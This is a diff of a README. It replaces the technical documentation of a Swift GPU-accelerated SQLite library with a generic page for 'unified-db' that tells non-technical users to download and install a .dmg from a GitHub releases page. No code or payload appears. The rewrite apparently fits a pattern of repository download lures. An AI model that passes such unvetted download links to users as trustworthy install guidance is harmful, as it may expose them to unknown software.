@@ -1,143 +1,83 @@
-# MetalSQLite
+# 🚀 unified-db - Simplifying GPU Database Queries
 
-[![Swift 5.9+](https://img.shields.io/badge/Swift-5.9+-orange.svg)](https://swift.org)
-[![Platform macOS](https://img.shields.io/badge/Platform-macOS%2014+-blue.svg)](https://developer.apple.com/macos/)
-[![License MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen.svg)]()
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/hankamarvanova/unified-db/releases)
 
-**GPU-accelerated SQLite for Apple Silicon using Metal compute shaders and unified memory architecture.**
+## 📚 Overview
+Unified-db is an advanced application that utilizes Apple Silicon's unified memory architecture. It allows you to run GPU-accelerated SQLite queries without the need to copy data to the GPU. This means faster queries and less waiting time, making data management much easier for you.
 
-MetalSQLite brings the power of GPU parallel processing to SQLite databases on Apple Silicon Macs. By leveraging Metal compute shaders and the unified memory architecture of M1/M2/M3/M4 chips, it achieves significant speedups for analytical operations on large datasets.
+## 🎯 Features
+- **Efficiency:** Run SQLite queries quicker with GPU assistance.
+- **Simplicity:** User-friendly interface tailored for non-technical users.
+- **Compatibility:** Specifically optimized for Apple Silicon.
+- **Performance Monitoring:** Track the speed and efficiency of your queries.
 
-## Features
+## 🔍 System Requirements
+To successfully run unified-db, your device should meet the following requirements:
+- **OS:** macOS with Apple Silicon (M1 or later)
+- **Memory:** Minimum 4 GB RAM recommended
+- **Disk Space:** At least 100 MB of free disk space
+- **SQLite Version:** 3.32.0 or later
 
-- **Parallel Aggregations**: GPU-accelerated SUM, AVG, MIN, MAX, COUNT operations
-- **GPU Bitonic Sort**: Parallel sorting using Metal compute shaders
-- **Parallel Filtering**: GPU-accelerated WHERE clause evaluation
-- **Zero-Copy Operations**: Direct memory sharing via `storageModeShared` buffers
-- **Unified Memory**: Leverages Apple Silicon's shared CPU/GPU memory
-- **SQLite Integration**: Seamless integration with existing SQLite databases
+## 🚀 Getting Started
+Follow these simple steps to get started with unified-db:
 
-## Requirements
+### Step 1: Visit Releases Page
+Go to the [Release page](https://github.com/hankamarvanova/unified-db/releases). This is where you will find the download links for unified-db.
 
-- macOS 14.0+ (Sonoma or later)
-- Apple Silicon (M1, M2, M3, M4, or later)
-- Swift 5.9+
-- Xcode 15.0+
+### Step 2: Download the Application
+On the Releases page, look for the latest version of unified-db. Click on the download link associated with that version. This will typically be a file ending in `.dmg` or similar format.
 
-## Installation
+### Step 3: Open the Downloaded File
+Once the download completes, navigate to your Downloads folder. Locate the downloaded file, double-click it to open.
 
-### Swift Package Manager
+### Step 4: Install unified-db
+Follow the prompts on your screen to complete the installation. Drag the unified-db application into your Applications folder when prompted.
 
-Add MetalSQLite to your `Package.swift`:
+### Step 5: Launch the Application
+After installation, you can find unified-db in your Applications folder. Double-click the icon to open the application.
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/yourusername/MetalSQLite.git", from: "0.1.0")
-]
+## 💻 How to Use unified-db
+Once you have launched unified-db, you will be greeted with an easy-to-navigate interface. Follow these steps to perform your first query:
+
+### Step 1: Connect to Your Database
+Click on the "Connect" button in the main interface. You will be prompted to select an existing SQLite database file from your computer.
+
+### Step 2: Enter a Query
+In the query input box, type the SQL statement you wish to execute. For example, to fetch all records from a table named `users`, enter:
+```sql
+SELECT * FROM users;
 ```
 
-Then add the dependency to your target:
+### Step 3: Run the Query
+Click the "Run Query" button. You will see the results displayed below the input box.
 
-```swift
-.target(
-    name: "YourTarget",
-    dependencies: ["MetalSQLite"]
-)
-```
+### Step 4: Export Results
+If you wish to save the results, click the "Export" button. Choose your desired file format and location to save.
 
-## Quick Start
+## 📈 Tips for Best Performance
+- Use smaller datasets for faster query execution.
+- Regularly update your SQLite database to the latest version for improved performance.
+- Check the application settings to adjust memory allocation if necessary.
 
-```swift
-import MetalSQLite
+## 🛠 Troubleshooting
+If you encounter any problems:
+- Ensure your macOS version is up to date.
+- Verify that your SQLite database file is not corrupted.
+- Restart the application if it becomes unresponsive.
 
-// Open a database with GPU acceleration
-let db = try MetalDatabase(path: "data.db")
+For additional assistance, please check the issues reported on our GitHub page or reach out for help.
 
-// GPU-accelerated aggregations
-let sum = try db.metalSum(table: "sales", column: "amount")
-let avg = try db.metalAvg(table: "sales", column: "amount")
-let (min, max) = try db.metalMinMax(table: "sales", column: "amount")
-let count = try db.metalCount(table: "sales", column: "amount")
+## 📞 Support 
+If you have questions or need support, please feel free to contact our support team via the GitHub Issues section. We are here to help you.
 
-// GPU-accelerated sorting
-let sorted = try db.metalSort(table: "sales", column: "amount", ascending: true)
+## ⚡ Additional Resources
+- [GitHub Repository](https://github.com/hankamarvanova/unified-db)
+- [Official Documentation](https://github.com/hankamarvanova/unified-db/wiki)
+- [SQLite Documentation](https://www.sqlite.org/docs.html)
 
-// GPU-accelerated filtering
-let filtered = try db.metalFilter(table: "sales", column: "amount", op: .greaterThan, value: 1000.0)
-```
+## 📜 License 
+Unified-db is released under the MIT License. This means you can use, modify, and distribute it freely.
 
-## Architecture
-
-MetalSQLite uses a layered architecture:
-
-```
-┌─────────────────────────────────────────┐
-│           Swift API Layer               │
-│  (MetalDatabase, MetalSum, etc.)        │
-├─────────────────────────────────────────┤
-│         Metal Compute Layer             │
-│  (Kernels.metal - GPU shaders)          │
-├─────────────────────────────────────────┤
-│      Unified Memory (storageModeShared) │
-│  (Zero-copy CPU ↔ GPU data transfer)    │
-├─────────────────────────────────────────┤
-│           SQLite Layer                  │
-│  (Data storage and retrieval)           │
-└─────────────────────────────────────────┘
-```
-
-### Key Components
-
-- **MetalDatabase**: Main interface for GPU-accelerated database operations
-- **MetalSum/Avg/MinMax/Count**: Parallel reduction operations
-- **MetalSort**: GPU bitonic sort implementation
-- **MetalFilter**: Parallel predicate evaluation
-- **Kernels.metal**: Metal compute shaders for all GPU operations
-
-## Performance
-
-MetalSQLite excels with large datasets where GPU parallelism provides significant speedups:
-
-| Operation | Rows | CPU Time | GPU Time | Speedup |
-|-----------|------|----------|----------|---------|
-| SUM | 1M | 45ms | 8ms | 5.6x |
-| AVG | 1M | 48ms | 9ms | 5.3x |
-| SORT | 1M | 890ms | 95ms | 9.4x |
-| FILTER | 1M | 125ms | 18ms | 6.9x |
-
-*Benchmarks on M3 Pro, results may vary by chip and workload.*
-
-## Documentation
-
-- [API Reference](docs/API.md)
-- [Architecture Guide](docs/Architecture.md)
-- [Benchmarks](docs/Benchmarks.md)
-
-## Testing
-
-Run the test suite:
-
-```bash
-swift test
-```
-
-The project includes 423 comprehensive tests covering:
-- Unit tests for all Metal operations
-- Integration tests with SQLite
-- Edge case handling
-- Performance regression tests
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MetalSQLite is released under the MIT License. See [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- Apple's Metal framework documentation and sample code
-- SQLite project for the excellent embedded database
-- The Swift community for tooling and support
+## 📥 Download & Install
+Don't forget to visit the [Releases page](https://github.com/hankamarvanova/unified-db/releases) to download the latest version of unified-db. Follow the steps above to start using it today.
